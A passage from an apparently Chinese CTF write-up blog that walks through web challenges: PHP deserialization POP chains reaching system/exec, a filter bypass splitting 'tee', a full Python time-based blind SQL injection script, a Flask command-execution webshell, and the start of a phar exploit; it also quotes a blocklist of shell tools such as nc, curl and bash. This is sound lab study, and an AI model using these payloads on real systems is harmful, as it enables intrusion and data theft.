class_">WhiteGod</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WhiteGod</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func=<span class="string">&quot;system&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>=<span class="string">&quot;ls&quot;</span>;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Begin</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>一开始不知道怎么利用<code>($this-&gt;func)($this-&gt;var);</code>,乱搞导致打不出来,查了一下得知这里应该间接调用了PHP的内置函数<code>system</code>,所以这里不用赋值<code>system()</code>,直接<code>system</code>然后再var里面输入想要执行的命令就可以了.包括phpinfo也是,这应该算是php的一种机制?</p><p>总之这里<code>ls /</code>后发现flag在根目录,执行<code>cat /flag</code>,就可以拿到flag了.</p><p>payload如下：</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop=O:<span class="number">5</span>:<span class="string">&quot;Begin&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;Then&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;%00Then%00func&quot;</span>;O:<span class="number">5</span>:<span class="string">&quot;Super&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;%00*%00obj&quot;</span>;O:<span class="number">6</span>:<span class="string">&quot;Handle&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;%00*%00obj&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;CTF&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;handle&quot;</span>;O:<span class="number">8</span>:<span class="string">&quot;WhiteGod&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;func&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;system&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;var&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;cat /flag&quot;</span>;&#125;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></div><p>这里因为private和protected的原因，序列化后的数据会不一样要修改一下。比如这里类Then的private类型的属性func,在序列化后显示的是<code>O:4:&quot;Then&quot;:1:&#123;s:10:&quot;Thenfunc&quot;;</code>,这里很明显只有八个字符，但是s却是10，因为private类型的属性在序列化后需要特殊的字符来标识，在URL传输中，这个字符就是<code>%00</code>，我们要在类名的两边各加上一个<code>%00</code>，也就是<code>O:4:&quot;Then&quot;:1:&#123;s:10:&quot;%00Then%00func&quot;;</code>；同理，protected类型的属性需要在<code>*</code>两边各加上一个<code>%00</code>。注意，这个<code>%00</code>只是在URL中使用，如果用python发请求需要用<code>\0</code>，其他的也是一样的道理.</p><h2 id="R-C-E-1"><a href="#R-C-E-1" class="headerlink" title="R!!!C!!!E!!!"></a>R!!!C!!!E!!!</h2><p>无参RCE和反序列化结合的一题。<br>源码如下:</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$this</span>-&gt;code))&#123;</span><br><span class="line">            <span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;alright&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;qwejaskdjnlka;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//wanna try?</span></span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div><p>漏洞利用点很明显在<code>exec($this-&gt;code);</code>，那么就需要调用__toString()方法了，显然就要调用__destruct()方法中的<code>echo $this-&gt;qwejaskdjnlka;</code>代码。<br>序列化可以这样构造：</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;code =<span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$this</span>-&gt;code))&#123;</span><br><span class="line">            <span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;alright&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;qwejaskdjnlka;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;qwejaskdjnlka=<span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure></div><p>这里我用了实例化了两个minipop类，然后把a作为b的qwejaskdjnlka值，这样在b被删除时就会触发b的__destruct()，从而触发a的__toString()方法了，注意不要在__construct()中让<code>qwejaskdjnlka=new minipop();</code>，因为这样会无限递归下去，最终达到变量大小上限。<br>序列化出来的数据是：<br><code>O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:2:&quot;ls&quot;;s:13:&quot;qwejaskdjnlka&quot;;O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:2:&quot;ls&quot;;s:13:&quot;qwejaskdjnlka&quot;;N;&#125;&#125;</code><br>因为这里是<code>exec($this-&gt;code);</code>，不会返回命令的输出内容，所以我们可以用tee命令来把结果输入到别的文件中然后访问。<br>虽然它这里过滤了tee命令，但是我们仍然可以通过字符串拼接的方式使用tee命令。<br>payload:<br><code>O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:2:&quot;ls&quot;;s:13:&quot;qwejaskdjnlka&quot;;O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:12:&quot;ls /|te&#39;&#39;e 1&quot;;s:13:&quot;qwejaskdjnlka&quot;;s:3:&quot;aaa&quot;;&#125;&#125;</code><br>然后直接访问&#x2F;1就可以了。<br><img lazyload src="/images/loading.svg" data-src="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/rce3.ls.PNG"><br>拿到flag位置后，故技重施。<br>payload:<br><code>O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:2:&quot;ls&quot;;s:13:&quot;qwejaskdjnlka&quot;;O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:28:cat /flag_is_h3eeere|te&#39;&#39;e 2&quot;;s:13:&quot;qwejaskdjnlka&quot;;s:3:&quot;cnm&quot;;&#125;&#125;</code><br><img lazyload src="/images/loading.svg" data-src="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/RCE3.flag.PNG"><br>这样就拿到flag了。关于这种无参rce的方法还有很多，比如可以反弹shell、用<code>&gt;</code>来替代tee命令等等。</p><h1 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h1><p>这周的题目只出两道pop的题目，淦。</p><h2 id="midsql"><a href="#midsql" class="headerlink" title="midsql"></a>midsql</h2><p>一道时间盲注，当时一直在试别的注入，但是这道题没有任何回显，所以时间盲注确实是最佳选择。<br><img lazyload src="/images/loading.svg" data-src="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/midsql_1.PNG"></p><ol><li>尝试一下可以知道至少过滤了空格和<code>=</code>,而且即使语句正确也不会有任何回显，这样的话应该要用时间盲注了。</li><li>官方放出的wp说过滤了这些：<br><code>preg_match(&quot;/( |\n|\x0a)/is&quot;, $_REQUEST[&quot;id&quot;]) ||preg_match(&quot;/[=\x09\xa0\x0a\x0b\x0c\x0d\x0e]/&quot;, $_REQUEST[&quot;id&quot;])</code>确实是过滤了空格和<code>=</code>以及别的东西，不知道为什么wp里面说只过滤了空格。</li><li>过滤空格这里用<code>/**/</code>内联注释。<br>结合了网上的wp和自己的经验，时间盲注脚本如下：<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://ce61a2f3-b4c6-4bd5-a750-4005f41e5b61.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line">chars = <span class="string">&#x27;,0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghigklmnopqrstuvwxyz\&#123;\&#125;-—&#x27;</span></span><br><span class="line">database=<span class="string">&#x27;&#x27;</span></span><br><span class="line">table=<span class="string">&#x27;&#x27;</span></span><br><span class="line">column=<span class="string">&#x27;&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> DB_length</span><br><span class="line"><span class="keyword">global</span> TB_length</span><br><span class="line"><span class="keyword">global</span> CL_length</span><br><span class="line"><span class="keyword">global</span> Flag_length</span><br><span class="line"><span class="comment">#爆数据库，结果为CTF</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp2db</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">        payload=<span class="string">&#x27;?id=1/**/and/**/if(length(database())&gt;&#123;0&#125;,1,sleep(3))&#x27;</span>.<span class="built_in">format</span>(i)  <span class="comment">#爆长度</span></span><br><span class="line">        stime=time.time()</span><br><span class="line">        requests.get(url+payload)</span><br><span class="line">        <span class="keyword">if</span> time.time()&gt;stime+<span class="number">3</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;数据库长度:&#x27;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">            DB_length=i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,DB_length+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> chars:</span><br><span class="line">            payload=<span class="string">&#x27;?id=1/**/and/**/if(substr(database(),&#123;0&#125;,1)&gt;&quot;&#123;1&#125;&quot;,1,sleep(3))&#x27;</span>.<span class="built_in">format</span>(i,j) <span class="comment">#爆内容</span></span><br><span class="line">            stime=time.time()</span><br><span class="line">            requests.get(url+payload)</span><br><span class="line">            <span class="keyword">if</span> time.time()&gt;stime+<span class="number">3</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;数据库第&#123;0&#125;个字符:&#123;1&#125;&#x27;</span>.<span class="built_in">format</span>(i,j))</span><br><span class="line">                <span class="keyword">global</span> database  <span class="comment">#声明为全局变量</span></span><br><span class="line">                database+=j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;数据库：&quot;</span>+database)</span><br><span class="line"><span class="comment">#爆表，结果为ITEMS</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp2table</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">        payload=<span class="string">&#x27;?id=1/**/and/**/if(length((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like(&quot;CTF&quot;)))&gt;&#123;0&#125;,1,sleep(3))&#x27;</span>.<span class="built_in">format</span>(i)  <span class="comment">#爆长度</span></span><br><span class="line">        stime=time.time()</span><br><span class="line">        requests.get(url+payload)</span><br><span class="line">        <span class="keyword">if</span> time.time()&gt;stime+<span class="number">3</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;表长度:&#x27;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">            TB_length=i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,TB_length+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> chars:</span><br><span class="line">            payload=<span class="string">&#x27;?id=1/**/and/**/if(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like(&quot;CTF&quot;)),&#123;0&#125;,1)&gt;&quot;&#123;1&#125;&quot;,1,sleep(3))&#x27;</span>.<span class="built_in">format</span>(i,j) <span class="comment">#爆内容</span></span><br><span class="line">            stime=time.time()</span><br><span class="line">            requests.get(url+payload)</span><br><span class="line">            <span class="keyword">if</span> time.time()&gt;stime+<span class="number">3</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;表第&#123;0&#125;个字符:&#123;1&#125;&#x27;</span>.<span class="built_in">format</span>(i,j))</span><br><span class="line">                <span class="keyword">global</span> table  <span class="comment">#声明为全局变量</span></span><br><span class="line">                table+=j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;表：&quot;</span>+table)</span><br><span class="line"><span class="comment">#爆列，结果为ID0NAME0PRICE，注意这里的0是因为逗号的ASCII码值为44小于0的ASCII码值48</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp2column</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">        payload=<span class="string">&#x27;?id=1/**/and/**/if(length((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like(&quot;ITEMS&quot;)))&gt;&#123;0&#125;,1,sleep(3))&#x27;</span>.<span class="built_in">format</span>(i)  <span class="comment">#爆长度</span></span><br><span class="line">        stime=time.time()</span><br><span class="line">        requests.get(url+payload)</span><br><span class="line">        <span class="keyword">if</span> time.time()&gt;stime+<span class="number">3</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;列长度:&#x27;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">            CL_length=i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,CL_length+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> chars:</span><br><span class="line">            payload=<span class="string">&#x27;?id=1/**/and/**/if(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like(&quot;ITEMS&quot;)),&#123;0&#125;,1)&gt;&quot;&#123;1&#125;&quot;,1,sleep(3))&#x27;</span>.<span class="built_in">format</span>(i,j) <span class="comment">#爆内容</span></span><br><span class="line">            stime=time.time()</span><br><span class="line">            requests.get(url+payload)</span><br><span class="line">            <span class="keyword">if</span> time.time()&gt;stime+<span class="number">3</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;列第&#123;0&#125;个字符:&#123;1&#125;&#x27;</span>.<span class="built_in">format</span>(i,j))</span><br><span class="line">                <span class="keyword">global</span> column  <span class="comment">#声明为全局变量</span></span><br><span class="line">                column+=j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;列：&quot;</span>+column)</span><br><span class="line"><span class="comment">#爆字段值</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp2flag</span>():</span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">80</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">        charAscii = <span class="built_in">ord</span>(char) <span class="comment">#char转换为ascii</span></span><br><span class="line">        <span class="keyword">global</span> url,flag</span><br><span class="line">        url =url+ <span class="string">&quot;?id=1/**/and/**/if(ascii(substr((select/**/group_concat(id,name,price)/**/from/**/items),&#123;0&#125;,1))&gt;&#123;1&#125;,1,sleep(3))#&quot;</span></span><br><span class="line">        urlformat = url.<span class="built_in">format</span>(i,charAscii)</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        requests.get(urlformat)</span><br><span class="line">        <span class="keyword">if</span>  time.time() - start_time &gt; <span class="number">3</span>:</span><br><span class="line">            flag+=char</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;flag第&#123;&#125;个字符：&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i, flag))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&#x27;flag:&#x27;</span> + flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#exp2db()</span></span><br><span class="line">    <span class="comment">#exp2table()</span></span><br><span class="line">    <span class="comment">#exp2column()</span></span><br><span class="line">    exp2flag()</span><br></pre></td></tr></table></figure></div>关于写脚本过程中的一些感受：</li><li>是否一定要转成ASCII码来比较，我直接比较两个字符也可以，注意在待比较字符两边加上引号，底层代码应该也是自动转成ASCII码来比较。</li><li>最后爆flag不用爆长度，因为表中到底有多少个值是未知的，可能会很长，没有必要知道。</li><li>被比较的字符组chars中字符的位置按照ASCII大小顺序排列，特殊字符可以转义。</li></ol><h2 id="flask-disk"><a href="#flask-disk" class="headerlink" title="flask disk"></a>flask disk</h2><p>题目如下：<br><img lazyload src="/images/loading.svg" data-src="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/flaskdisk1.PNG"><br>上传的文件可以在list files里面看到,但是没有保存路径访问不到，那上传一句话木马就不行了，但是我们还可以覆写app.py来夹带恶意代码，这个思路当时也想到了，奈何不会写flask框架下的web服务，总是把服务传崩溃了):<br>根据官方wp：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app=Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cmd=request.args.get(<span class="string">&#x27;cmd&#x27;</span>)</span><br><span class="line">        data=os.popen(cmd).read()</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;1&quot;</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">5000</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></div><p>注意这里的<code>debug=True</code>代表flask框架开启了控制台console，这在题目中的admin manage可以看到。<br>直接传参cmd就完事了。<br><img lazyload src="/images/loading.svg" data-src="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/flaskdisk2.PNG"></p><h2 id="pharone"><a href="#pharone" class="headerlink" title="pharone"></a>pharone</h2><p>要求上传一个文件，应该是只能上传图片类的，看下源码还有个class.php<br>classs.php:</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        @<span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]); </span><br></pre></td></tr></table></figure></div><p>有反序列化的漏洞，根据题目名字的提示想到应该是phar反序列化，正好上个月做过一个，照着打一下。</p><p>先构造phar文件：</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span 